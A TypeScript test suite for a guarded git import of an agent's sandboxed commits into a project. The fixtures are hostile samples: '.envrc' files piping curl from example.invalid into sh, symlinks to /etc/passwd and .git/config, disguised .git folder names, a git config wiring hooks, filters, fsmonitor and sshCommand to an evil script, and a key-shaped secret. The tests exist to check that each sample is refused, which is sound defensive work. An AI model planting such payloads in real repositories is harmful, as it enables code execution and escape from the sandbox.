/**
 * The controlled import (flexible-import.ts, the Flexible plan v2 §1 and the F2 enable gate 2), with the build's
 * constant replaced (vi.mock), against real git repositories: every check runs in the quarantine before any ref moves,
 * each refusal names what it found and leaves the project's refs exactly as they were (and its objects without the
 * candidate), a clean import makes exactly the import ref and the thread's branch, and the thread's repository is
 * attacker input: its config, hooks and attributes never run, and git never runs in it at all.
 */
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { existsSync, mkdirSync, readdirSync, rmSync, symlinkSync, writeFileSync, chmodSync } from "node:fs";
import { join } from "node:path";
import { prepareFlexibleThread, type FlexibleThreadPaths, type FlexibleThreadRow } from "./flexible-thread.js";
import { FLEXIBLE_IMPORTS_DIR, flexibleImportRef, foldName, importFlexibleCandidate, linkLeadsOut, readFlexibleCandidate, removeFlexibleImportRefs } from "./flexible-import.js";
import { run, type ExecResult, type RunOptions } from "./exec.js";
import { spawnSync } from "node:child_process";
import { THREAD_GIT_ENV, tgit, threadWorld, type ThreadWorld } from "../test/flexible-thread-world.js";

vi.mock("./flexible-available.js", async original => ({ ...await original<typeof import("./flexible-available.js")>(), flexibleAvailable: () => true }));

const NOW = new Date("2026-11-15T12:00:00.000Z");
let world: ThreadWorld;
let thread: FlexibleThreadRow, paths: FlexibleThreadPaths;
/** Every git call the import makes, as the shared runner receives it (after teardown-git.ts hardened it). */
let calls: { args: readonly string[]; cwd: string | undefined }[];
const spy = (file: string, args: readonly string[], options?: RunOptions): Promise<ExecResult> => {
  if (file === "git") calls.push({ args, cwd: options?.cwd });
  return run(file, args, options);
};

beforeEach(async () => {
  world = threadWorld();
  calls = [];
  const made = await prepareFlexibleThread(world.store, { repo: world.project, base: "HEAD", by: "alex", now: NOW });
  if (!made.ok) throw new Error(made.message);
  ({ thread, paths } = made);
});
afterEach(() => { world.store.close(); rmSync(world.dir, { recursive: true, force: true }); });

const projectRefs = () => tgit(world.project, "for-each-ref", "--format=%(refname) %(objectname)");
const has = (sha: string) => { try { tgit(world.project, "cat-file", "-e", `${sha}^{commit}`); return true; } catch { return false; } };
const tip = () => tgit(paths.repo, "rev-parse", "HEAD");
/** The thread's agent committing, as an attacker could: `git add -f` past its exclude list. */
function commit(files: Record<string, string>, message = "thread work"): string {
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(join(paths.repo, name, ".."), { recursive: true });
    writeFileSync(join(paths.repo, name), text);
    tgit(paths.repo, "add", "-f", "--", name);
  }
  tgit(paths.repo, "commit", "-qm", message);
  return tip();
}
const importNow = (seq = 1, branchBefore: string | null = null, expected = tip(), limits?: Parameters<typeof importFlexibleCandidate>[1]["limits"]) =>
  importFlexibleCandidate(world.store, { thread: thread.id, seq, expected, branchBefore, by: "alex", now: NOW, runner: spy, ...(limits === undefined ? {} : { limits }) });

/** Git plumbing in the thread's repository, bytes exactly as given (names a case-insensitive filesystem or git's
 * porcelain would fold or refuse are written as they are). */
function plumb(args: string[], input?: string): string {
  const ran = spawnSync("git", args, { cwd: paths.repo, env: THREAD_GIT_ENV, encoding: "utf8", ...(input === undefined ? {} : { input }) });
  if (ran.status !== 0) throw new Error(`git ${args.join(" ")}: ${ran.stderr}`);
  return ran.stdout.trim();
}
/** A commit on the thread's branch whose tree is its base's plus `extra` (path → file text, or a link's target), made
 * with plumbing. */
function plant(extra: Record<string, string | { link: string }>): string {
  type Node = Map<string, Node | { mode: string; sha: string }>;
  const top: Node = new Map();
  const put = (path: string, entry: { mode: string; sha: string }) => {
    const parts = path.split("/");
    let at = top;
    for (const part of parts.slice(0, -1)) { let next = at.get(part); if (next === undefined || !(next instanceof Map)) { next = new Map(); at.set(part, next); } at = next as Node; }
    at.set(parts.at(-1)!, entry);
  };
  for (const line of plumb(["ls-tree", "-r", "-z", thread.baseSha]).split("\0").filter(Boolean)) {
    const [meta, path] = line.split("\t") as [string, string];
    const [mode, , sha] = meta.split(" ") as [string, string, string];
    put(path, { mode, sha });
  }
  for (const [path, value] of Object.entries(extra)) {
    const text = typeof value === "string" ? value : value.link;
    put(path, { mode: typeof value === "string" ? "100644" : "120000", sha: plumb(["hash-object", "-w", "--stdin"], text) });
  }
  const write = (node: Node): string => plumb(["mktree", "-z"], [...node].map(([name, entry]) => entry instanceof Map ? `040000 tree ${write(entry)}\t${name}` : `${entry.mode} blob ${entry.sha}\t${name}`).join("\0") + "\0");
  const commit = plumb(["commit-tree", write(top), "-p", thread.baseSha, "-m", "planted"]);
  plumb(["update-ref", `refs/heads/toolroll/code-${thread.id}`, commit]);
  return commit;
}
/** A key-shaped line, built at run time so this file holds none. */
const keyLine = () => `const key = "${["AKIA", "Q7ZK", "M3XW", "P9TR", "B2NV"].join("")}";\n`;

describe("a clean import", () => {
  test("makes exactly the import ref and the thread's branch, fetches the candidate, and leaves no quarantine behind", async () => {
    const before = projectRefs();
    const candidate = commit({ "src/feature.js": "export const feature = 1;\n" });
    expect(has(candidate)).toBe(false);
    const read = await readFlexibleCandidate(world.store, { thread: thread.id, runner: spy });
    expect(read).toEqual({ ok: true, candidate, base: world.second, changedPaths: ["src/feature.js"] });
    const imported = await importNow();
    expect(imported).toEqual({ ok: true, candidate, importRef: flexibleImportRef(thread.id, 1), branch: `toolroll/code-${thread.id}`, branchBefore: null, refsChanged: [] });
    expect(projectRefs()).toBe([...before.split("\n"), `${flexibleImportRef(thread.id, 1)} ${candidate}`, `refs/heads/toolroll/code-${thread.id} ${candidate}`].sort().join("\n"));
    expect(has(candidate)).toBe(true);
    // The project's checked-out branch is where it was.
    expect(tgit(world.project, "rev-parse", "HEAD")).toBe(world.second);
    expect(readdirSync(join(paths.root, FLEXIBLE_IMPORTS_DIR))).toEqual([]);
    expect(world.store.handle.prepare("SELECT outcome FROM action_ledger WHERE action = 'flexible import'").all().map(row => row["outcome"])).toEqual(["imported"]);
  });

  test("the next send is n+1: a new import ref, the branch moved by compare-and-swap from exactly the last import, the earlier ref kept", async () => {
    const first = commit({ "a.txt": "one\n" });
    expect(await importNow(1)).toMatchObject({ ok: true });
    const second = commit({ "a.txt": "two\n" });
    // A send that names the wrong branch value moves nothing.
    expect(await importNow(2, null)).toMatchObject({ ok: false, reason: "import-refused", check: "branch-moved" });
    expect(await importNow(1, first)).toMatchObject({ ok: false, check: "import-exists" });
    expect(await importNow(2, first)).toMatchObject({ ok: true, candidate: second, branchBefore: first });
    expect(tgit(world.project, "rev-parse", `refs/heads/toolroll/code-${thread.id}`)).toBe(second);
    expect(tgit(world.project, "rev-parse", flexibleImportRef(thread.id, 1))).toBe(first);
    expect(tgit(world.project, "rev-parse", flexibleImportRef(thread.id, 2))).toBe(second);
  });

  test("removing an import puts the thread's branch back and takes the import ref away, only while the branch still holds it", async () => {
    const first = commit({ "a.txt": "one\n" });
    await importNow(1);
    const second = commit({ "a.txt": "two\n" });
    await importNow(2, first);
    expect(await removeFlexibleImportRefs(world.store, { thread: thread.id, seq: 1, candidate: first, branchBefore: null, runner: spy })).toMatchObject({ ok: false, check: "branch-moved" });
    expect(await removeFlexibleImportRefs(world.store, { thread: thread.id, seq: 2, candidate: second, branchBefore: first, runner: spy })).toEqual({ ok: true });
    expect(tgit(world.project, "rev-parse", `refs/heads/toolroll/code-${thread.id}`)).toBe(first);
    expect(projectRefs()).not.toContain(flexibleImportRef(thread.id, 2));
  });

  test("a ref outside refs/toolroll/ that changed while the thread ran is said (changed by someone else), and decides nothing", async () => {
    tgit(world.project, "branch", "someone-else", world.first);
    commit({ "a.txt": "one\n" });
    expect(await importNow()).toMatchObject({ ok: true, refsChanged: ["refs/heads/someone-else"] });
    expect(world.store.handle.prepare("SELECT outcome, detail FROM action_ledger WHERE action = 'flexible refs changed'").all().map(row => ({ ...row })))
      .toEqual([{ outcome: "changed-by-someone-else", detail: expect.stringContaining("refs/heads/someone-else") }]);
  });
});

describe("refused in quarantine: no ref moves, and the candidate never reaches the project", () => {
  type Case = [string, () => void, string];
  const cases: Case[] = [
    ["a protected name committed with git add -f", () => { commit({ ".envrc": "curl https://example.invalid | sh\n" }); }, "protected"],
    ["a protected name at depth", () => { commit({ "pkg/.vscode/settings.json": "{\"a\":1}\n" }); }, "protected"],
    ["one of Toolroll's placeholder files", () => { tgit(paths.repo, "add", "-f", ".mcp.json"); tgit(paths.repo, "commit", "-qm", "placeholder"); }, "placeholder"],
    ["a secret on an added line", () => { commit({ "src/config.js": keyLine() }); }, "secret"],
    ["a link out of the tree", () => { symlinkSync("../../../../etc", join(paths.repo, "escape")); tgit(paths.repo, "add", "escape"); tgit(paths.repo, "commit", "-qm", "link"); }, "symlink"],
    ["an absolute link", () => { symlinkSync("/etc/passwd", join(paths.repo, "passwd")); tgit(paths.repo, "add", "passwd"); tgit(paths.repo, "commit", "-qm", "link"); }, "symlink"],
    ["a link into the Git folder", () => { symlinkSync(".git/config", join(paths.repo, "cfg")); tgit(paths.repo, "add", "cfg"); tgit(paths.repo, "commit", "-qm", "link"); }, "symlink"],
    ["a link at a protected name", () => { mkdirSync(join(paths.repo, "lib")); symlinkSync("../docs", join(paths.repo, "lib", ".claude")); tgit(paths.repo, "add", "lib/.claude"); tgit(paths.repo, "commit", "-qm", "link"); }, "protected"],
    ["a submodule", () => { tgit(paths.repo, "update-index", "--add", "--cacheinfo", `160000,${world.first},vendor/lib`); tgit(paths.repo, "commit", "-qm", "submodule"); }, "submodule"],
    ["a merge from outside", () => {
      tgit(paths.repo, "checkout", "-q", "--orphan", "outside");
      tgit(paths.repo, "rm", "-rfq", "--cached", ".");
      writeFileSync(join(paths.repo, "outside.txt"), "from elsewhere\n");
      tgit(paths.repo, "add", "outside.txt");
      tgit(paths.repo, "commit", "-qm", "outside");
      tgit(paths.repo, "checkout", "-qf", `toolroll/code-${thread.id}`);
      tgit(paths.repo, "merge", "-q", "--allow-unrelated-histories", "--no-edit", "outside");
    }, "merge"],
    ["a secret added in one commit and taken out in the next (history, not just the net change)", () => {
      commit({ "src/config.js": keyLine() });
      commit({ "src/config.js": "const key = process.env.KEY;\n" });
    }, "secret"],
    ["a protected file added in one commit and removed in the next", () => {
      commit({ "pkg/.envrc": "curl https://example.invalid | sh\n" });
      tgit(paths.repo, "rm", "-q", "pkg/.envrc");
      tgit(paths.repo, "commit", "-qm", "take it back");
    }, "protected"],
    ["a chain of links that leads out: a -> b, b -> ../../etc", () => {
      symlinkSync("../../etc", join(paths.repo, "b"));
      symlinkSync("b", join(paths.repo, "a"));
      tgit(paths.repo, "add", "a", "b");
      tgit(paths.repo, "commit", "-qm", "links");
    }, "symlink"],
    ["a chain each of whose links stays inside alone: dir/up -> .., dir/out -> up/..", () => {
      mkdirSync(join(paths.repo, "dir"));
      symlinkSync("..", join(paths.repo, "dir", "up"));
      symlinkSync("up/..", join(paths.repo, "dir", "out"));
      tgit(paths.repo, "add", "dir/up", "dir/out");
      tgit(paths.repo, "commit", "-qm", "links");
    }, "symlink"],
    ["an evil merge: a change made only inside a merge of the thread's own commits", () => {
      tgit(paths.repo, "checkout", "-q", "-b", "side");
      commit({ "side.txt": "side\n" });
      tgit(paths.repo, "checkout", "-q", `toolroll/code-${thread.id}`);
      commit({ "main.txt": "main\n" });
      tgit(paths.repo, "merge", "-q", "--no-commit", "--no-ff", "side");
      writeFileSync(join(paths.repo, "src-evil.js"), keyLine());
      tgit(paths.repo, "add", "src-evil.js");
      tgit(paths.repo, "commit", "-qm", "merge, with a change of its own");
    }, "merge"],
    ["a branch that doesn't build on its base", () => {
      tgit(paths.repo, "checkout", "-q", "--orphan", "unrelated");
      tgit(paths.repo, "commit", "-qm", "unrelated", "--allow-empty");
      tgit(paths.repo, "branch", "-f", `toolroll/code-${thread.id}`, "unrelated");
    }, "not-descendant"],
  ];

  test.each(cases)("%s", async (_name, make, check) => {
    const before = projectRefs();
    make();
    const candidate = tgit(paths.repo, "rev-parse", `refs/heads/toolroll/code-${thread.id}`);
    const refused = await importNow(1, null, candidate);
    expect(refused).toMatchObject({ ok: false, reason: "import-refused", check });
    expect(refused.ok === false && refused.message).toMatch(/Nothing was imported\./);
    expect(projectRefs()).toBe(before);
    expect(has(candidate)).toBe(false);
    expect(readdirSync(join(paths.root, FLEXIBLE_IMPORTS_DIR))).toEqual([]);
  });

  test("nothing committed, a branch that moved since the terms, and a branch someone else made: refused, nothing written", async () => {
    const before = projectRefs();
    expect(await readFlexibleCandidate(world.store, { thread: thread.id, runner: spy })).toMatchObject({ ok: false, check: "nothing-to-send" });
    const shown = commit({ "a.txt": "one\n" });
    commit({ "a.txt": "two\n" });
    expect(await importNow(1, null, shown)).toMatchObject({ ok: false, check: "candidate-changed" });
    expect(projectRefs()).toBe(before);
    tgit(world.project, "branch", `toolroll/code-${thread.id}`, world.first);
    expect(await importNow(1, null)).toMatchObject({ ok: false, check: "branch-moved" });
    expect(projectRefs()).toBe([...before.split("\n"), `refs/heads/toolroll/code-${thread.id} ${world.first}`].sort().join("\n"));
  });

  test("a link inside the tree is fine; the rule for where links lead", async () => {
    for (const [path, target, out] of [["a/b", "../c", false], ["a/b", "../../c", true], ["b", "./c/../d", false], ["b", "/abs", true], ["b", "", true], ["a/b", "x/.GIT/config", true], ["b", "C:\\x", true]] as const) {
      expect(linkLeadsOut(path, target), `${path} -> ${target}`).toBe(out);
    }
    symlinkSync("README.md", join(paths.repo, "readme-link"));
    tgit(paths.repo, "add", "readme-link");
    tgit(paths.repo, "commit", "-qm", "link");
    expect(await importNow()).toMatchObject({ ok: true });
  });
});

test("a new link through a link already in the tree that leads out is refused", async () => {
  // The project has its own link out of the tree (its business); a thread's link through it leads out too.
  symlinkSync("../../outside", join(world.project, "ext"));
  tgit(world.project, "add", "ext");
  tgit(world.project, "commit", "-qm", "an outward link of the project's own");
  const made = await prepareFlexibleThread(world.store, { repo: world.project, base: "HEAD", by: "alex", now: NOW });
  if (!made.ok) throw new Error(made.message);
  ({ thread, paths } = made);
  const before = projectRefs();
  symlinkSync("ext/secrets", join(paths.repo, "inner"));
  tgit(paths.repo, "add", "inner");
  tgit(paths.repo, "commit", "-qm", "link through ext");
  expect(await importNow()).toMatchObject({ ok: false, reason: "import-refused", check: "symlink" });
  expect(projectRefs()).toBe(before);
});

test("a new link through an outward link already in the tree, spelled in another case, is refused (macOS folds names)", async () => {
  symlinkSync("../../outside", join(world.project, "ext"));
  tgit(world.project, "add", "ext");
  tgit(world.project, "commit", "-qm", "an outward link of the project's own");
  const made = await prepareFlexibleThread(world.store, { repo: world.project, base: "HEAD", by: "alex", now: NOW });
  if (!made.ok) throw new Error(made.message);
  ({ thread, paths } = made);
  const before = projectRefs();
  const candidate = plant({ inner: { link: "EXT/passwd" } });
  expect(await importNow(1, null, candidate)).toMatchObject({ ok: false, reason: "import-refused", check: "symlink" });
  expect(projectRefs()).toBe(before);
});

describe("names as a case-insensitive, normalising filesystem sees them", () => {
  test.each([
    ["an NFC and an NFD spelling of one name", { "caf\u00e9.txt": "one\n", "cafe\u0301.txt": "two\n" }, "ambiguous"],
    ["two names that differ only in case", { "Readme.md": "two\n" }, "ambiguous"],
    ["a .GIT folder", { ".GIT/config": "[core]\n" }, "protected"],
    ["a .git. folder (Windows drops the dot)", { ".git./hooks/post-checkout": "#!/bin/sh\n" }, "protected"],
    ["a .git spelled with a character HFS+ ignores", { ".g\u200cit/config": "[core]\n" }, "protected"],
    ["a protected name in another case", { "PKG/.ENVRC": "curl https://example.invalid | sh\n" }, "protected"],
  ] as const)("%s is refused, and no ref moves", async (_name, extra, check) => {
    const before = projectRefs();
    const candidate = plant(extra as Record<string, string>);
    expect(await importNow(1, null, candidate)).toMatchObject({ ok: false, reason: "import-refused", check });
    expect(projectRefs()).toBe(before);
    expect(has(candidate)).toBe(false);
  });
  test("the folding rule", () => {
    for (const [a, b] of [["A.txt", "a.txt"], ["caf\u00e9", "cafe\u0301"], [".GIT", ".git"], [".git.", ".git"], [".git ", ".git"], [".g\u200dit", ".git"]] as const) expect(foldName(a), `${a} ~ ${b}`).toBe(foldName(b));
    expect(foldName("ab")).not.toBe(foldName("a"));
  });
});

describe("limits hold while listing, and the import has one deadline", () => {
  const many = () => Object.fromEntries(Array.from({ length: 10 }, (_, at) => [`many/f${at}.txt`, `${at}\n`]));
  test.each([
    ["more objects than allowed", { objects: 3 }, "too-large"],
    ["more bytes uncompressed than allowed", { inflatedBytes: 64 }, "too-large"],
    ["a tree with more entries than allowed", { treeEntries: 3 }, "too-large"],
    ["a deadline that has passed", { importMs: 1 }, "timed-out"],
  ] as const)("%s: refused, no ref moves", async (_name, limits, check) => {
    const before = projectRefs();
    commit(many());
    await new Promise(done => setTimeout(done, 5));
    expect(await importNow(1, null, tip(), limits)).toMatchObject({ ok: false, reason: "import-refused", check });
    expect(projectRefs()).toBe(before);
  });
  test("a walk of the thread's objects that runs past the import's deadline stops there, before any git runs", async () => {
    commit(many());
    calls = [];
    expect(await importNow(1, null, tip(), { importMs: 0 })).toMatchObject({ ok: false, reason: "import-refused", check: "timed-out" });
    expect(calls).toEqual([]);
    // Stopped in the walk itself: no quarantine was ever made.
    expect(existsSync(join(paths.root, FLEXIBLE_IMPORTS_DIR))).toBe(false);
  });
  test("a huge alternates file is refused without being read whole", async () => {
    const candidate = commit({ "a.txt": "one\n" });
    const alternates = join(paths.repo, ".git", "objects", "info", "alternates");
    chmodSync(alternates, 0o644);
    writeFileSync(alternates, `${world.objects}\n${"x".repeat(1024 * 1024)}\n`);
    expect(await importNow(1, null, candidate)).toMatchObject({ ok: false, reason: "thread-folder-changed", message: expect.stringContaining("too large") });
  });
  test("a thread objects folder with more entries than allowed is refused as it is walked", async () => {
    commit(many());
    expect(await importNow(1, null, tip(), { objectEntries: 3 })).toMatchObject({ ok: false, reason: "thread-folder-changed", message: expect.stringContaining("too many object files") });
  });
});

describe("the thread's repository is attacker input", () => {
  test("a hostile config, hooks and attributes: nothing of them runs, and no git runs in the thread's repository", async () => {
    const candidate = commit({ "src/app.js": "app\n", ".gitattributes": "* filter=evil diff=evil merge=evil\n" });
    // Planted after the commits (the agent's last act): every hook, a filter, textconv and merge driver, fsmonitor, the
    // upload-pack hook, an alias, and an attributes file in its own info folder.
    const marker = join(world.dir, "ran");
    const script = join(world.dir, "evil.sh");
    writeFileSync(script, `#!/bin/sh\necho "$0 $*" >> ${marker}\ncat\n`);
    chmodSync(script, 0o755);
    const gitdir = join(paths.repo, ".git");
    chmodSync(join(gitdir, "config"), 0o644);
    writeFileSync(join(gitdir, "config"), `${["[core]", `\tfsmonitor = ${script}`, `\thooksPath = ${join(gitdir, "evil-hooks")}`, "[uploadpack]", `\tpackObjectsHook = ${script}`,
      "[filter \"evil\"]", `\tclean = ${script}`, `\tsmudge = ${script}`, "\trequired = true", "[diff \"evil\"]", `\ttextconv = ${script}`, `\tcommand = ${script}`,
      "[merge \"evil\"]", `\tdriver = ${script}`, "[core]", `\tsshCommand = ${script}`, "[alias]", `\tfetch = !${script}`].join("\n")}\n`);
    for (const dir of ["hooks", "evil-hooks"]) {
      mkdirSync(join(gitdir, dir), { recursive: true });
      for (const hook of ["pre-commit", "post-checkout", "reference-transaction", "post-index-change", "pre-auto-gc", "post-rewrite", "fsmonitor-watchman"]) {
        writeFileSync(join(gitdir, dir, hook), `#!/bin/sh\n${script} ${hook}\n`, { mode: 0o755 });
      }
    }
    writeFileSync(join(gitdir, "info", "attributes"), "* filter=evil diff=evil\n");
    expect(await importNow(1, null, candidate)).toMatchObject({ ok: true, candidate });
    expect(existsSync(marker)).toBe(false);
    // Every git call came through the hardened runner (no hooks, no fsmonitor), in the quarantine or the project,
    // never in the thread's own repository.
    expect(calls.length).toBeGreaterThan(5);
    for (const call of calls) {
      // The runner's own look at the repository's (view's) config before each command, or the command, hardened.
      const inspection = call.args.join(" ") === "--no-optional-locks config --list --show-scope -z";
      if (!inspection) expect(call.args).toEqual(expect.arrayContaining(["core.hooksPath=/dev/null", "core.fsmonitor=false", "core.commitGraph=false", "--no-replace-objects"]));
      expect(call.cwd === world.project || call.cwd?.startsWith(join(paths.root, FLEXIBLE_IMPORTS_DIR))).toBe(true);
      expect(call.cwd).not.toBe(paths.repo);
    }
  });

  test("alternates pointing at another project, a link in its objects, or a symbolic branch ref: refused before anything is read, no ref moves", async () => {
    const before = projectRefs();
    const candidate = commit({ "a.txt": "one\n" });
    const alternates = join(paths.repo, ".git", "objects", "info", "alternates");
    chmodSync(alternates, 0o644);
    writeFileSync(alternates, `${join(world.other, ".git", "objects")}\n`);
    expect(await importNow(1, null, candidate)).toMatchObject({ ok: false, reason: "thread-folder-changed" });
    writeFileSync(alternates, `${world.objects}\n`);
    symlinkSync(join(world.other, ".git", "objects"), join(paths.repo, ".git", "objects", "elsewhere"));
    expect(await importNow(1, null, candidate)).toMatchObject({ ok: false, reason: "thread-folder-changed" });
    rmSync(join(paths.repo, ".git", "objects", "elsewhere"));
    const ref = join(paths.repo, ".git", "refs", "heads", "toolroll", `code-${thread.id}`);
    writeFileSync(ref, "ref: refs/heads/main\n");
    expect(await importNow(1, null, candidate)).toMatchObject({ ok: false, check: "candidate-unreadable" });
    expect(projectRefs()).toBe(before);
    expect(calls.filter(call => call.cwd === world.project).length).toBe(0);
  });
});
